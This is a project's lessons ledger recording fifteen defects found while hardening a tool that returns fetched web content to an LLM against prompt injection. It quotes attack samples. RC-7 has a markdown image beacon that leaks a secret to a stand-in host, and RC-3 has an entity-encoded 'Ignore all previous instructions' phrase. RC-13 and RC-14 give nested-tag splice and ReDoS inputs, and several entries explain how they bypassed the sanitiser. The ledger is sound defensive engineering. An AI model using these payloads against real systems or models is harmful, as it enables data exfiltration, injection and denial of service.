# Lessons

> Seeded by `/sixees-workflow:init-compound`. **It is yours now** — nothing
> overwrites it, and nothing refreshes it. Append to it; do not rewrite it.

**This file is the Reality Correction ledger.** Every RC lands here permanently,
as well as in the PR handoff it was filed in — because a handoff is read once, by
the run that wrote it, and then archived. An RC recorded only there expires at
merge, and the next session rediscovers the lesson and files it again under a new
number. This is the one place a lesson outlives the run that learned it.

It is not a changelog. A changelog says what shipped; this says what reality
turned out to be, and what it cost to find out. Read it when a rule looks
arbitrary, and **before planning anything that touches a surface an RC already
names** — but never as a checklist: a defect matching none of these still needs
its own investigation.

---

## Filing an RC

**When.** The plan said X and reality was Y, and the work had to change course.
Not this: plan typos go to commit history, requirement pivots to a kickoff update,
unrelated bugs to the todo system.

**Number.** `RC-N`, sequential across the whole trail. The unit — per project, per
feature or per theme — is declared in this project's Compound Engineering profile.
Claim it at the time; it is durable once assigned.

**Where.** Both of: inline in the PR handoff beside the work it corrected, and
appended to the ledger below. Add a one-line `POST-AUDIT` annotation in the plan
pointing at the RC, and **never retro-edit plan text** — the plan records what was
believed, and correcting it in place destroys the evidence that anything diverged.

### Entry format

```markdown
### RC-N — <one line: what reality turned out to be>

**Date:** YYYY-MM-DD · **PR:** #N · **Plan:** <path>

**Class:** <the `K-` shapes and local `C` classes this instantiates, or `—`>

- **The plan said:** what was assumed, and where that assumption came from.
- **Reality was:** what was actually true, and how it was discovered.
- **What changed:** the decision taken, with the specific files and symbols.
- **What this costs next time:** the rule, if there is one. Not every RC yields a
  rule; say so rather than inventing one.
```

Every field is required; `—` fills one that has no value. Name the files and
symbols — an RC that says "fixed the auth handling" is a note to nobody, because
the next reader needs to know *where* to be careful. Closing prose after the four
bullets is fine for who found it and how, but it never stands in for them.

**A near-miss is recorded as caught**, never re-framed as a failure that slipped
through. A dense ledger is the discipline working; a thin one usually means filing
stopped, not that diverging did.

**Settled conflicts stay settled** — `.claude/rules/03-divergence.md` owns that
rule. A finding that reverses an earlier round goes to the director, and the
answer is recorded here as an RC later rounds cite rather than re-litigate.

---

## Shapes

**The `K-` shapes live in `.claude/rules/01-known-shapes.md`, not here.** Rules
load at the start of every session, so the vocabulary is in context *before* the
work — the only time a lookout list helps. They are shipped prose refreshed by
`/sixees-workflow:refresh-compound`, so a copy here would freeze at the day it was
seeded. **Do not restate the table**, and do not edit the loaded copy —
`.claude/rules/` is a materialisation, so a local change to it is lost at the next
refresh. A shape you want changed is a change to the plugin; a shape that is
*yours* goes below.

An entry's `Class:` field cites those ids. Instances are a query, never a list
maintained by hand:

```bash
grep -n '^\*\*Class:\*\* .*K-9' LESSONS.md          # every entry citing K-9
grep -c '^\*\*Class:\*\* —$' LESSONS.md              # entries that matched no shape
```

The `class-id` half of the field comes from `skill: review-findings` → *The
class-id vocabulary*, which is append-only and is a cross-run join key. **A noun
that is not on that list joins nothing** — take the closest one that is, and say
so on the line.

### A shape this project earned

**A shape seen three times *here* that the loaded table does not name — number it
`C1`, `C2`, …, never `K-`.** Different prefixes so a grep for one cannot match the
other, and so it stays visible which shapes were inherited and which this project
paid for itself. State the rule once and let the entries cite it; **a heading
never owns the list of its instances**, because that copy goes stale on the next
entry and then reads as the shape being obsolete.

**`—` is a real answer**, and so is a long-empty section — the inherited table is
a wide net. But treat a *run* of `—` as the list missing something, not as a tidy
ledger.

**Naming the shape is a step in filing, not a periodic tidy-up**, which is why the
entry format has a field for it: a blank field is a question the filer has to
answer, where a paragraph of law is not. Measured once, in the project that wrote
this section — the law was stated, nothing asked the question, and the ledger
reached RC-45 with nine shapes past the threshold, **one** heading written, and an
entry restating an existing class under a new name with its own counter.

---

## RC ledger

> Newest last. Append; never edit an entry once filed. If an RC turns out to be
> wrong, file a new one that says so and cite it.
>
> **Two annotations may be added to a filed entry, and nothing else:** a
> `**Class:**` line, and a `**Mechanism superseded:**` line naming what no longer
> exists at HEAD and the RC that replaced it. Both are additive — they sit above
> the body and change no word of it, because the body records what was believed.
>
> **The body is frozen; an annotation is maintained.** It points at HEAD, so when
> HEAD moves again the pointer names the newer RC — an annotation that has itself
> gone stale is the defect it exists to prevent.
>
> **The superseded annotation is required, not optional**, because an entry's
> lesson outlives its fix and this format states both in one breath. A binding
> entry is cited rather than re-checked, so stale mechanism prose inside one is
> the most expensive a repository can hold: the next round is told not to look.

### RC-1 — An invariant can be satisfied by the bug it was written to prevent

**Date:** 2026-09-01 · **PR:** #32 · **Plan:** — (none; this PR carried no plan)

**Class:** K-1, K-2 — *class-id:* `lost-code-path`, `fail-open-default` —
aliases `unescaped-sink`, `oversized-payload`, `injectable-input`,
`repeated-computation`

**Mechanism superseded:** RC-17 (2026-09-03). The pipeline half of this entry is
unchanged and still load-bearing. The *boundary* half no longer describes HEAD:
`splitResponseHeaders` is deleted and response headers arrive on their own file
descriptor, so nothing derives the split at all. Rule 2 below is what survived
and generalised — it is now invariant 13's strong form.

- **The plan said:** splitting response headers out of the body was a contained
  fix. The code comment at `curl-execute.ts::executeCurlRequest` stated the
  intent correctly — *"splitting it out must not route it around that"* — and
  `ARCHITECTURE.md` invariant 1, written in the same PR, required every byte
  returned to the LLM to pass through sanitisation. Both were believed to hold.
- **Reality was:** both held in letter and the defect was live anyway.
  `sanitizeAndDetect` is Step 2 of a five-step pipeline; `processResponse` Steps
  3–5 (markup comments, `<script>`/`<style>` fixed point, markdown beacons,
  numeric-entity re-detect) were silently lost for the header channel. Header
  text had been defended for years *because it was concatenated into the body* —
  never by anything that named it. Separately, `parser.ts::splitResponseHeaders`
  recovered the boundary by pattern-matching status lines, which cannot work: a
  body may legitimately be an HTTP transcript, so a real header block and a
  forged one are the same bytes. That let a remote launder its own content into
  the metadata channel and silently truncate the body, and made the scan
  quadratic — 2MB of crafted stdout blocked the event loop for 2.9s,
  extrapolating to ~74s at the 10MB ceiling, all of it after the abort timer
  could still fire.
- **What changed:** Steps 2–5 extracted as `processor.ts::defendText`, called by
  both `processResponse` and the header path, so no caller can assemble a shorter
  pipeline. `splitResponseHeaders` now takes the boundary from cURL's own
  `%{size_header}` on the `-w` channel behind the unguessable per-request
  separator, and fails closed when it is undetermined. Header text is capped at
  `LIMITS.MAX_HEADER_TEXT_BYTES` where it is produced, not at the four sites that
  emit it. `ARCHITECTURE.md` gained invariants 1a, 13 and 14.
- **What this costs next time:** three rules.
  1. **An invariant the defect satisfies is not an invariant.** "Goes through
     sanitisation" was satisfiable by one stage of five. Name the pipeline, not
     the property, wherever a partial application is possible.
  2. **A boundary between remote-controlled regions is never inferred from the
     bytes.** Take it from a channel the remote cannot write to, and fail closed
     when it is undetermined — "undetermined" and "absent" must not resolve the
     permissive way.
  3. **Text defended only as a side effect of where it sat loses that defence the
     moment it moves.** When splitting a value out of a processed buffer, ask
     what the buffer was doing *for* it, not only what the new path does *to* it.

### RC-2 — The fix for a boundary bug introduced a boundary bug one layer down

**Date:** 2026-09-01 · **PR:** #32 · **Plan:** — (review round 2)

**Class:** K-11, K-10 — *class-id:* `broken-contract`, `untyped-boundary`

**Mechanism superseded:** RC-17 (2026-09-03). No wire offset is applied to stdout
at HEAD, so this specific defect cannot recur. `stdoutBytes` remains a Buffer
deliberately, so that reintroducing an offset is a type change rather than a
silent one. Both rules below stand unchanged.

- **The plan said:** taking the header/body split from cURL's `%{size_header}`
  removed the class, because the offset now comes from a channel the origin
  cannot write to. RC-1 recorded that as settled.
- **Reality was:** the offset was correct and was applied to the wrong thing.
  `%{size_header}` counts **wire** bytes; `command-executor.ts::executeCommand`
  accumulated stdout with `stdout += data.toString()`, so every byte that is not
  valid UTF-8 became U+FFFD and re-encoded to three bytes where the wire had one.
  Indexing the re-encoded string with a wire offset splits early, gluing the
  header terminator onto the front of the body — the exact corruption the PR
  exists to remove. The fail-closed guard `headerBytes > buf.length` could never
  fire, because replacement only ever *inflates*: I wrote a guard for the right
  cause pointing the wrong way. The same `.toString()` per chunk also corrupted
  valid UTF-8 straddling a chunk boundary, which was pre-existing and which the
  fix made load-bearing.
- **What changed:** `executeCommand` accumulates `Buffer[]` and concatenates
  once, exposing `stdoutBytes`; `parseResponseWithMetadata` and
  `splitResponseHeaders` operate on octets and return `bodyBytes`.
  `ARCHITECTURE.md` invariant 13 gained its second half.
- **What this costs next time:** two rules.
  1. **An offset and the thing it indexes are one type, not two.** If a count is
     measured on representation A, it may only index representation A. Where a
     decode sits between them, the decode is the defect site — not the indexer.
  2. **A guard must point the way the failure actually goes.** Ask which
     direction the quantity moves under the fault before writing the comparison.
     A length check against inflation catches nothing, and reads as protection.

### RC-3 — "Over-stripping costs nothing" was false: the pipeline is not purely subtractive

**Date:** 2026-09-01 · **PR:** #32 · **Plan:** — (review round 2)

**Class:** K-3 — *class-id:* `unescaped-sink`

- **The plan said:** declaring header text `text/markdown` — the strictest
  grammar — was safe, because running extra strip stages on a header value could
  only remove things. The comment said so in terms.
- **Reality was:** `strip-blocks.ts::stripBlocksFixedPoint` calls
  `decodeNumericHtmlEntities` and **returns the decoded content**. A header
  carrying inert `&#x49;&#x67;&#x6e;...` — text Step 2 correctly passed as
  harmless — came out as a live `Ignore all previous instructions`. On a body
  that is correct, because the renderer would decode anyway and Step 5 needs to
  see the decoded form. On a channel whose consumer does not decode, it is
  additive: the pipeline manufactured the payload on the origin's behalf.
- **What changed:** `stripBlocksFixedPoint` takes `{ decodeEntities }`;
  `defendText` exposes it; the header channel passes `false`.
- **What this costs next time:** **"stricter" is only safe for stages that
  subtract.** Before applying a pipeline to a channel it was not written for,
  enumerate which of its stages *transform* rather than remove, and ask what the
  consumer of that channel does with the result. A stage that decodes, expands or
  normalises adds meaning, and adding meaning to attacker-controlled text is
  authoring it for them.

### RC-4 — Internal work products were published to npm by a wildcard

**Date:** 2026-09-01 · **PR:** #32 · **Plan:** — (review round 2)

**Class:** K-3 — *class-id:* `missing-validation`, `unretained-pii`

- **The plan said:** `docs/` is the project's documentation tree, and
  `CONVENTIONS.md` — written in this same PR — states plainly that anything put
  there ships to npm consumers, so authors would write accordingly.
- **Reality was:** the very next act in the same PR was to write
  `docs/todos/001` — an **open, severity P1** security todo naming an unfixed
  defence gap, its call site, its missing stages and a worked failure scenario —
  into that published tree, alongside a profile stating the repository has no
  branch protection and no required reviews. `package.json` `files` was
  `["dist","docs"]`, so both would have shipped in the tarball with the version
  they describe a gap in. npm forbids re-publishing a version and bars unpublish
  after 72 hours. `docs/brainstorms/` had been shipping this way already.
- **What changed:** `files` names the seven consumer documents explicitly;
  `src/lib/release-guards.test.ts` fails if anything under `docs/todos/`,
  `work/`, `plans/`, `compound/`, `solutions/` or `brainstorms/` resolves into
  the package, with a positive control asserting the consumer docs still do.
- **What this costs next time:** **a convention that only prose enforces is not
  enforced.** The rule was written down, in the same change that broke it, by the
  same author, and that is the strongest available evidence that the layer was
  wrong rather than the author careless. Where a rule governs an irreversible act
  — publish, push, delete — put it in something that runs. Also: **an allowlist
  of directories is a wildcard over their future contents.** `files: ["docs"]`
  was a decision about every file anyone would ever put there.

### RC-5 — The guard written to enforce RC-4 contained the defect RC-2 named

**Date:** 2026-09-01 · **PR:** #32 · **Plan:** — (review round 3, self-probe)

**Class:** K-1 — *class-id:* `missing-validation` — instantiates RC-2's rule 2

- **The plan said:** `src/lib/release-guards.test.ts` closed RC-4 by putting the
  publish-time rules into something that runs. Two guards: nothing internal in
  the tarball, and no `### BREAKING` heading unbacked by a major bump.
- **Reality was:** only the first had teeth. The second computed the prior major
  as `[...all version headings].filter(n => n !== major)`, intending to skip the
  current release's own heading — but that filter drops **every** prior 3.x
  release too, leaving an empty list, `lastMajor = 0`, and an assertion of
  `3 > 0` that passes for any 3.x version forever. Reintroducing a `BREAKING`
  heading at 3.3.0 did not fail the suite. Found only by probing the guard;
  nothing about reading it suggested a problem.
- **What changed:** the prior major now comes from the first version heading
  strictly below the top section. Both guards re-probed: reverting `files` to the
  `docs/` wildcard fails the tarball tests, and a `BREAKING` heading at 3.3.0
  fails the version test.
- **What this costs next time:** **a guard is not done when it is written, only
  when it has been made to fail.** This is RC-2's second rule — *a guard must
  point the way the failure actually goes* — reappearing one round later, inside
  the fix for a different RC, written by someone who had just recorded that rule.
  Knowing a lesson is not the same as applying it, so the control cannot be
  knowledge; it has to be the probe. Treat "I wrote a guard" and "I saw the guard
  fail" as different states, and never report the first as the second.

  Corollary, because this is where it hid: **an exclusion written to skip *this*
  item will usually skip a whole class of items.** `!== major` meant "not this
  release" to the author and "no 3.x release at all" to the machine. Prefer
  positional selection (the heading below) over value-based exclusion when the
  value is not unique.

### RC-6 — A sweep that enumerates the weak call finds only channels that make it

**Date:** 2026-09-01 · **PR:** #32 · **Plan:** — (review round 3)

**Class:** K-4 — *class-id:* `unescaped-sink`, `missing-validation`

- **The plan said:** `docs/todos/001` tracked the remaining channels taking a
  shorter defence path, and its sweep — `rg 'sanitizeAndDetect\('` — enumerated
  them. Two instances were recorded and the class was believed bounded. Three
  reviewers across two rounds ran variants of that query and agreed.
- **Reality was:** the query can only surface a channel that calls a *weaker*
  defence. A channel calling **none** matches nothing and reads as absent. cURL
  stderr was exactly that: passed verbatim from `executeCurlRequest` to
  `formatResponse`, reaching the model with no sanitisation, no strip, no
  injection logging — and under `verbose: true` it carries the origin's own
  response headers. It had been there the whole time, invisible to every sweep
  because the sweep was derived from the instance in hand rather than from the
  class's definition.
- **What changed:** stderr now takes `defendText` with the same arguments as the
  header channel. Todo 001's sweep was replaced with one over the *sink* —
  `rg 'output\.[a-z_]+ = |text: '` across the formatter and the tools — and the
  reason the old one was wrong is recorded there so it is not reinstated.
- **What this costs next time:** **derive the sweep from what the class IS, not
  from what the found instance DOES.** "Channels that call `sanitizeAndDetect`"
  is a description of two known sites; "text that reaches the returned result" is
  the class. The first is a list of the bugs already found — `CONVENTIONS.md` →
  *Tests* states the same rule for deny-lists, and it binds sweeps identically.
  A practical test: ask whether the query could match an instance nobody has seen
  yet. If it can only match code shaped like the example, it is not a sweep.

### RC-7 — The recommended fix was inert, and the todo that carried it had been reviewed by three agents

**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`

**Class:** K-3 — *class-id:* `stale-observation`

- **The plan said:** todo 001's recommended remedy, written up in three
  numbered options with option 1 marked "the recommendation": call `defendText`
  from `jq_query` passing `contentType: "application/json"`, "so the sniffer
  stays off but the markdown/beacon stages still run."
- **Reality was:** that call runs **no** strip stage at all. In `defendText`,
  `application/json` makes `supportsMarkupComments` false, `isMarkdownContentType`
  false and `isSniffableContentType` false — the last one deliberately, so
  `looksLikeMarkupShape` never mangles a JSON string field. `needsStripPath` is
  therefore false and Steps 3–5 are skipped entirely. Measured before writing
  anything: `defendText('{"d":"see ![x](https://evil.test/?d=secret) end"}',
  { contentType: "application/json" })` returns its input byte-identical. The
  proposed fix and the defect it was written against produce the same bytes.
- **What changed:** nothing was implemented from that option. The audit was
  taken back to the director with the measurement, and the scope was re-cut
  around what the code actually does — see RC-8 for the substantive half.
- **What this costs next time:** **a remedy written into a todo is an untested
  hypothesis, and reads exactly like a conclusion.** This one survived being
  filed by one reviewer, cited by a second, and carried through three review
  rounds and a merge, because at no point did anyone have a reason to run it —
  the todo's job was to defer the work, and deferring is what everybody did.
  The specific trap is that the sentence *"pass X so that Y still happens"* is
  two claims wearing one clause: the first is a code change and the second is a
  prediction about a function nobody re-read. Audit the *remedy* against HEAD
  with the same suspicion as the plan's premises — `docs/compound/`'s Step 2
  says "does the plan match reality", and a proposed fix is part of the plan.
  It cost four minutes to check and would have cost a shipped no-op.

### RC-8 — The instance was mis-scoped: the asymmetry was JSON-vs-everything, not jq_query-vs-curl_execute

**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`

**Class:** K-4, K-11 — *class-id:* `unescaped-sink`

- **The plan said:** `jq_query` takes "a shorter defence path than `defendText`",
  and its failure scenario compared the beacon it returns against the same
  content "returned through `curl_execute` on a markdown response", which is
  replaced with `[image removed]`. Severity P1, with an acceptance criterion
  requiring a regression test that the beacon **is stripped**.
- **Reality was:** `jq_query` cannot return non-JSON. `applyJqFilter` parses its
  input with `JSON.parse` and throws otherwise, then returns
  `JSON.stringify(...)`. And `defendText` on a JSON document *is*
  sanitise-and-detect — the markup and markdown stages are excluded for JSON,
  deliberately. So `jq_query` was already doing what `defendText` would have
  done, and the like-for-like comparison is `curl_execute --jq_filter` on the
  same file, which strips nothing either. The chosen comparator — a *markdown*
  response — was the one content type that made the gap appear.

  The genuine gap was the sibling instance the todo listed second and rated
  "more serious": `post-processor.ts::processTextPart`, where the wrap is the
  only defence for `registerCustomTool()` returns, `beforeRequest`
  short-circuits and YAML endpoint results.
- **What changed:** the wrap now calls `defendText` with
  `contentTypeUndetermined: true` and `decodeEntities: false`. A module-private
  `DEFENDED` symbol, set by `markDefended()` and claimed only by `curl_execute`'s
  and `jq_query`'s SUCCESS returns, stops that from double-processing text
  already defended under a real Content-Type. `jq_query` now calls
  `defendText(contentType: JSON_MIME)` instead of reproducing its JSON arm, with
  no behaviour change. **The strip-inside-JSON half was declined, not deferred** —
  the exclusion is one decision applying identically to three call sites, it
  governs bytes `save_to_file` persists and `jq_query` reads back, and closing it
  is a different argument from the one the todo made. Pinned by tests in
  `jq-query.test.ts` naming this RC, so a later round reads the decision rather
  than re-opening it.
- **What this costs next time:** **a comparator is part of a finding's evidence,
  and picking the one that shows the gap is how a mis-scope survives review.**
  The todo compared a JSON-only tool against a markdown response; against the
  JSON response it can actually be given, the difference is zero. Before filing
  "X is weaker than Y", state the input X actually accepts and re-run the
  comparison on that. The second cost is smaller and sharper: **the instance a
  finding is *named* after is not always the one that matters.** This todo's
  title, id and P1 rating all pointed at `jq_query`; the live defect was in the
  paragraph underneath, and it stayed open for the round that fixed the title.

### RC-9 — The agreed fix was dropped after the code argued against it

**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`

**Class:** K-11 — *class-id:* `fail-open-default`

- **The plan said:** the kickoff option the director chose included widening
  `processor.ts::isDefinitelyJson` to recognise every JSON root — string, number,
  boolean, null — not just `{` and `[`, so that jq output would be classified
  consistently rather than by which path the caller happened to select.
- **Reality was:** `isDefinitelyJson` also gates the **body** path in
  `processResponse`, where the input is attacker-controlled. Widening it to
  string roots would let a remote escape the strictest grammar by sending a body
  that is exactly `"…beacon…"`, quotes included — one more spelling of an
  already-accepted bypass, added to close a coherence problem that had a cheaper
  answer. The predicate has two callers and the fix was designed against one.
- **What changed:** nothing. `isDefinitelyJson` was left as it is. For an
  untagged channel the narrow predicate errs *strict*, which is the safe
  direction, and the coherence goal was met elsewhere.
- **What this costs next time:** **before changing a shared predicate, name its
  other callers and ask which direction each of them fails in.** The same
  widening is safe on one side of this seam and a bypass on the other, and
  nothing about the function says so. This is K-11 in its plainest form — the
  fix landed on the defect's mirror — and the tell was that the predicate is
  called from both a channel we own and a channel a remote fills.

### RC-10 — A settled decision was reversed by an argument that had not been made when it was settled

**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-5 — *class-id:* `fail-open-default`

- **The plan said:** RC-8, filed three hours earlier in this same run, declined
  to strip markdown beacons inside JSON string values. Its reasoning:
  `processResponse` writes post-strip content to disk and `jq_query` reads it
  back, so stripping would silently alter a persisted document.
- **Reality was:** that reasoning is sound and does not reach the
  post-processor wrap. **The wrap's channels have no disk artefact** — a
  `registerCustomTool()` return goes straight to the model — and a model renders
  a beacon inside a JSON string value exactly as it renders one outside it.
  RC-8 had reasoned about one call site's consequences and applied the
  conclusion to all three. The same review also showed the exemption made the
  defence depend on `include_metadata`: with it true the body sits inside a JSON
  envelope the exemption protects, with it false it does not, so the same bytes
  got two different treatments selected by an output-format flag.
- **What changed:** `defendText` gained `excludeJsonDocuments`; the wrap passes
  `false`. The split is now explicit — what is PERSISTED keeps the exemption,
  what is RETURNED does not. `markDefended` and the `DEFENDED` symbol were
  removed entirely in the same commit, because the incoherence they were built
  to fix does not survive this change and their claim was worth less than it
  looked (see the commit body).
- **What this costs next time:** **a decision recorded with its reasoning can be
  reopened by showing the reasoning does not reach a site; a decision recorded as
  a verdict cannot.** RC-8 was reversed within hours precisely because it wrote
  down *why* rather than *what*, which let a reviewer test the why against a
  third call site and find it did not hold there. Per `03-divergence.md` a
  reversal goes to the director rather than being applied — it did, and this RC
  is the answer. **RC-8 stands for the body path and is not superseded**; only
  its reach was wrong.

### RC-11 — A guard's escape hatch was deleting the payload it was guarding

**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-2, K-5 — *class-id:* `silent-data-loss`

- **The plan said:** nothing about this. `strip-blocks.ts` had carried
  `<!--[\s\S]*?(?:-->|$)` since the strip path was written, and the docblock
  explains the `|$)` arm as absorbing orphan openers to satisfy CodeQL's
  "incomplete multi-character sanitization" rule. It reads as a completeness fix.
- **Reality was:** the replacement is the empty string, so on an opener with no
  closer that arm **deletes everything from the opener to end of input**.
  Measured: `"before <!-- unclosed\nafter, real content"` → `"before "`. Silent —
  no marker, no `isError`, no observable length delta, so a truncated result and
  a genuinely short one are the same bytes. Same shape for unclosed `<script>`
  and `<style>`. Pre-existing on the header and stderr channels; this branch
  added the custom-tool channel, where unclosed markup in HTML is ordinary and
  payloads are large.
- **What changed:** balanced blocks are still removed whole; an orphan opener has
  its TOKEN removed and its body stays as inert text. A test asserts no
  `<script`/`</script`/`<style`/`</style`/`<!--` token survives any unclosed
  shape, which is the property the `|$)` arm was actually carrying.
- **What this costs next time:** **when a sanitiser's fallback arm is "consume
  everything", ask what it consumes on a channel you are only a courier for.**
  Deleting to end-of-input is a defensible reading for a body being neutralised
  before a model reads it and indefensible for a payload the caller asked for,
  and the same code served both. The general form: a guard written for one
  channel's threat model gets reused as a primitive, and its most aggressive arm
  is the one that travels worst.

### RC-12 — Two channels' opposite needs were resolved by a per-caller flag, so every caller had to choose wrong

**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-13, K-11 — *class-id:* `unescaped-sink`

- **The plan said:** RC-3 established `decodeEntities: false` for channels whose
  consumer does not itself decode, because the decode's output is *returned* and
  would manufacture live markup from inert bytes. The director chose to retire
  the trade with a scratch copy: strip and detect see decoded text, the returned
  text stays undecoded.
- **Reality was:** the scratch copy does not resolve it, and finding out took
  building it. The commit rule has to decide what counts as the decode having
  "revealed" something. Keep it only when **markup was stripped**, and an
  entity-masked injection phrase never reaches Step 5's detector and an
  entity-masked `&#x200B;` never reaches the sanitiser — eight existing guards
  fail, correctly. Widen it to "commit when detection fires", and RC-3 returns
  exactly: the header case decodes an inert `&#x49;&#x67;nore…` into a live
  phrase in returned text. The two channels want opposite things from the same
  stage, and no single commit rule serves both.
- **What changed:** the scratch-decode attempt was **reverted**, preserved in the
  session scratchpad, and filed as `docs/todos/004`. What did land is the half
  that is unambiguous: a JSON document is never entity-decoded, whatever the
  origin declared. The sniffed arm already excluded JSON bodies; the
  declared-markup arm did not, so one mislabelled `Content-Type` turned
  `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}` — which no longer parses, and
  which `save_to_file` persisted for `jq_query` to fail on.
- **What this costs next time:** **a per-caller flag on a shared stage is a
  record that the design question was not answered.** `decodeEntities` looked
  like configuration and was actually two unreconciled requirements wearing one
  parameter — K-13, the wording got more precise while the layer went unnamed.
  The second lesson is about this run rather than the code: **an option accepted
  as "costs nothing either way" is a claim, and mine was wrong.** I relayed a
  reviewer's framing to the director without building it first. Prototype the
  option you are about to recommend, or say plainly that you have not.

### RC-13 — A finding was declined twice on a claim that was true only below a cap

**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-11, K-1 — *class-id:* `fail-open-default`

- **The plan said:** CodeQL's "incomplete multi-character sanitization" alerts on
  `stripTagBlocks` were false positives, because `stripBlocksFixedPoint` re-runs
  the pass until the output stops changing. That reply was written in review
  round 1 and repeated verbatim in round 2, against four alerts each time.
- **Reality was:** the loop is capped at four iterations, and a splice exposes
  exactly one layer per pass. `"<scr".repeat(4) + "<script>" + "ipt>".repeat(4)`
  returned a live `<script>` — the cap does not remove the class, it *sets the
  surviving depth*, and the attacker picks the depth. The decline was true below
  the cap and false above it, which is why re-reading the code confirmed it twice.
- **What changed:** both the tag strip and the comment strip are single
  left-to-right scans testing the OUTPUT tail after every character, so a token
  spliced out of a removal's neighbours is examined on the next push and
  convergence needs no iteration. Depth guards at 4, 5 and 40 for both tags,
  each verified to fail with the scan reverted to a `replace`.
- **What this costs next time:** **the round-2 fix for the comment path was the
  same defect, and it was applied one commit before the block-path decline was
  repeated.** Codex reported "five splice layers beat the four-pass cap" for
  `<!--`; that was accepted and fixed. CodeQL reported the identical shape for
  `<script>` in the same round and was declined. One reviewer's phrasing was
  believed and another's was not, for the same defect, in the same commit —
  K-11, the mirror side of a two-sided claim. **When a fix is applied to one
  member of a set, re-open every finding already declined about the other
  members**, because the decline was written before the fix existed.

### RC-14 — A bound was proved sound for the region and not for the attempt

**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-11, K-4 — *class-id:* `unbounded-growth`

- **The plan said:** after round 3, `strip-blocks.ts` was linear. The argument
  was written into `withinClosableRegion`'s docblock as **"sound, not
  approximate"**: no match can begin after the last closer, so bounding the
  pass at that closer changes no output and every attempt inside the region has
  a closer ahead of it and cannot fail by scanning to the end.
- **Reality was:** the second half of that sentence does not follow from the
  first. *Having* a closer ahead is not the same as being able to *reach* it.
  The opener `<script\b[^>]*>` has an attribute run that crosses `<`, so on
  `"<script".repeat(30000) + "</script>"` each opener consumed the region's one
  and only closer as its own opening-tag terminator, then searched to
  end-of-input for a second closer that did not exist. **2881 ms measured on a
  205 KB body, inside a bound that was computed correctly.** Reported by
  `chatgpt-codex-connector` on review round 4, against `7caedd7`.
- **What changed:** the opener's attribute run is now `[^<>]*`, matching the
  closer's and `lastTagCloserEnd`'s. Three ReDoS cases added — the axis every
  earlier flood structurally could not produce, since each either omitted the
  closer (empty region, pass never runs) or gave every opener its own `>`.
  2881 ms → 9 ms. All three verified to fail with the class reverted.
- **What this costs next time:** **round 2 fixed this exact class on the closer
  and left the opener, and the round-2 note explicitly argued the asymmetry was
  safe** — *"excluding `<` from a CLOSER is safe in a way it is not for an
  opener"*. That sentence was written while looking at the defect from one
  side, and it is the reason nobody checked the other. K-11 again, one round
  after RC-13 named it, which is what makes this worth a second entry rather
  than a footnote on the first: **naming a shape does not make the next
  instance visible, and both instances here were found by a reviewer rather
  than by the sweep the previous RC prescribed.** The sweep that would have
  found it is mechanical and takes a minute: *for every repeated character
  class, list every token the match must still consume after it, and check the
  class against all of them.* For the script/style opener that is `<` and `>`,
  which is why the class is `[^<>]*`. Excluding them all is sufficient rather
  than necessary — the real bar is that failing attempts partition the input —
  so a class that does not exclude one owes that argument in writing plus a
  flood case. The markdown label class is the worked example: it does not
  exclude `(` or `)`, and it is linear anyway because excluding `[` makes every
  attempt start at a `[` and every failing scan end at the next `[` or `]`. It
  is the acceptance criterion in `docs/todos/005`.

  **The first wording of that criterion said "the token the match must NEXT
  reach", and would have passed the very defect it was written for** — the next
  token after `<script\b[^>]*` is `>`, and `[^>]*` excludes `>`. Caught by
  coderabbitai in round 4, hours after it was written. A rule derived from a
  fix rather than from the fix's *class* inherits the fix's blind spot: K-1, on
  the remedy this time rather than on a test.

### RC-15 — A cap measured its input where the pipeline grows its output

**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-11 — *class-id:* `broken-contract`

- **The plan said:** `max_result_size` bounds what is surfaced inline, and
  invariant 14 already said in terms that "the cap is applied after the defence
  pipeline as well as before it, since `[link removed]` is longer than some of
  the forms it replaces". The invariant was written; the code was not.
- **Reality was:** this PR added a second defence pass at the post-processor
  wrap, downstream of every size gate. A `text/plain` body of
  `"[a](file:)".repeat(100)` — exactly 1000 bytes under a 1000-byte cap — stayed
  inline and reached the model as **1400 bytes**, with the gate reporting
  compliance. Reported by `chatgpt-codex-connector` in round 1 and independently
  by `coderabbitai` in round 2, which read it out of this branch's own handoff.
- **What changed:** `processor.ts::exceedsInlineCap` asks the question a size
  gate has to ask — *will this still be over the cap after the defence?* — and
  both `processResponse` and `executeJqQuery` gate on it. Over-cap now saves to
  a file, and the returned preview is the defended form, because truncating the
  raw form would leave the wrap free to grow it back over the limit.
- **What this costs next time, in three parts:**

  **The obvious fix was the wrong one, and the measurement is what said so.**
  "Plumb the cap into the wrap" is the natural reading, and at the wrap the body
  is already inside `formatResponse`'s JSON envelope — a compliant 1000-byte
  body arrives as a **1057-byte** text part under `include_metadata`. A wrap-side
  cap would truncate every correct metadata response, mid-JSON. **A cap has to
  be applied where the quantity it names still exists**, and `max_result_size`
  names the body, not the envelope.

  **A measurement acquired a side effect and the suite caught it.** The first
  version ran the full defence to weigh it, and that pass calls
  `sanitizeAndDetect`, which logs — silently converting a documented
  detect-on-original trade-off into a log line. The fix is two cheap arms that
  answer without the pass: already-over, and growth bounded by the placeholder
  ratio being unable to reach the cap. **A predicate that needs a side-effecting
  pass to answer should run it only where it can change the answer.**

  **And the first regression guard for the jq channel was toothless — the fifth
  on this branch.** It computed the cap with `JSON.stringify`, but jq
  pretty-prints with a two-space indent, so the assumed 530 bytes were really
  642: the result was already over the cap on its own size and saved to file
  with the fix reverted exactly as it did with the fix in. It passed for the
  wrong reason. **Derive a fixture's boundary from a real call, never from a
  re-implementation of what the code under test does.**

